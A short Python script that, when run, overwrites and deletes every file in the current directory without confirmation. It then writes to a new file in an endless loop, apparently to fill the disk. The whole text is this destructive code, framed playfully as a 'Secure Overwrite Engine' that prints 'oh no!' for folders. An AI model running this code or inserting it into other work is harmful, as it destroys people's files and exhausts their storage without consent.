import os

def shred_engine():
    os.system("clear")
    
    files = os.listdir()
    files.sort()
    
    for x in files:
        if os.path.isfile(x):
            print("Overwriting:", x)
            file = open(x,"w")
            file.write("abc")
            file.close()

        if os.path.isdir(x):
            print("oh no!")
            
    for x in files:
        if os.path.isfile(x):
            print("Deleting:", x)
            os.remove(x)

        if os.path.isdir(x):
            print("oh no!")

    print("Secure Overwrite Engine!")
            
    file = open("abc.abc", "w+")
	
    while True:
        file.write(str("abc"))
	
    file.close()
	
shred_engine()
